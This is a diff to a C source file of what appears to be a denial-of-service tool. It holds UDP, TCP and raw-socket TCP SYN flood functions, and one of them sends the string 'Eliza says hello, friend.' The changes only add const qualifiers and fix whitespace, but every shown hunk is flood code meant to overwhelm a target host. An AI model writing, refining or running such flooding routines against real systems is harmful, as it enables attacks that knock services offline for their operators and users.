@@ -23,7 +23,7 @@ unsigned short csum(unsigned short *ptr,int nbytes) {
     return(answer);
 }
 
-void udp_flood(char* ip, int port, char* message, int verbose) {
+void udp_flood(const char* ip, int port, char* message, int verbose) {
 	int sockfd;
     int n, len;
     char buffer[1024];
@@ -46,12 +46,12 @@ void udp_flood(char* ip, int port, char* message, int verbose) {
     	sendto(sockfd, (const char *)hello, strlen(hello), MSG_CONFIRM, (const struct sockaddr *) &servaddr, sizeof(servaddr));
     }
 }
-void tcp_flood(char* ip, int port, char* message, int verbose) {
+void tcp_flood(const char* ip, int port, char* message, int verbose) {
 	int sockfd;
     int n, len;
     char buffer[1024];
     char *hello = "Eliza says hello, friend.";
-	struct sockaddr_in     servaddr;
+	struct sockaddr_in servaddr;
 
 	memset(&servaddr, 0, sizeof(servaddr));
     servaddr.sin_family = AF_INET;
@@ -71,7 +71,7 @@ void tcp_flood(char* ip, int port, char* message, int verbose) {
 		write(sockfd, hello, sizeof(hello));
 	}
 }
-void tcpsyn_flood(char* ip, int port, char* message, int verbose) {
+void tcpsyn_flood(const char* ip, int port, char* message, int verbose) {
 	int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
 	char datagram[4096] , source_ip[32];
 	struct iphdr *iph = (struct iphdr *) datagram;
